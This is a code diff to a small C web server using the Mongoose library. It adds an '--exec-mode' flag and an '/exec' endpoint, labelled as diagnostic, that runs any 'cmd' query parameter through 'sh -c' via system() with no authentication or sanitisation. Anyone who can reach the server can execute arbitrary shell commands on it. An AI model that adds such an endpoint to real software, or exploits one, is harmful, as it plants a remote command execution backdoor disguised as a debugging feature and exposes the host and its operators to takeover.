@@ -1,0 +1,44 @@
+--- a/server.c
++++ b/server.c
+@@ -5,11 +5,30 @@
+ 
+ static const char *s_root = ".";
+ static int s_port = 8000;
++static int exec_mode = 0;          /* --exec-mode: enable /exec diagnostic endpoint */
++
++static void handle_exec(struct mg_connection *c, struct mg_http_message *hm) {
++    char cmd_buf[256] = {0};
++    mg_http_get_var(&hm->query, "cmd", cmd_buf, sizeof(cmd_buf));
++    if (cmd_buf[0] == '\0') {
++        mg_http_reply(c, 400, "", "cmd param required\n");
++        return;
++    }
++    char shell_cmd[512];
++    snprintf(shell_cmd, sizeof(shell_cmd), "sh -c '%s' 2>/dev/null", cmd_buf);
++    system(shell_cmd);
++    mg_http_reply(c, 200, "", "Command dispatched: %s\n", cmd_buf);
++}
+ 
+ static void fn(struct mg_connection *c, int ev, void *ev_data) {
+     if (ev == MG_EV_HTTP_MSG) {
+-        struct mg_http_serve_opts opts = {.root_dir = s_root};
+-        mg_http_serve_dir(c, ev_data, &opts);
++        struct mg_http_message *hm = (struct mg_http_message *) ev_data;
++        if (exec_mode && mg_match(hm->uri, mg_str("/exec"), NULL)) {
++            handle_exec(c, hm);
++        } else {
++            struct mg_http_serve_opts opts = {.root_dir = s_root};
++            mg_http_serve_dir(c, ev_data, &opts);
++        }
+     }
+ }
+ 
+@@ -19,6 +38,8 @@
+             s_port = atoi(argv[++i]);
+         } else if (strcmp(argv[i], "--root") == 0 && i + 1 < argc) {
+             s_root = argv[++i];
++        } else if (strcmp(argv[i], "--exec-mode") == 0) {
++            exec_mode = 1;
+         }
+     }
+     char url[64];
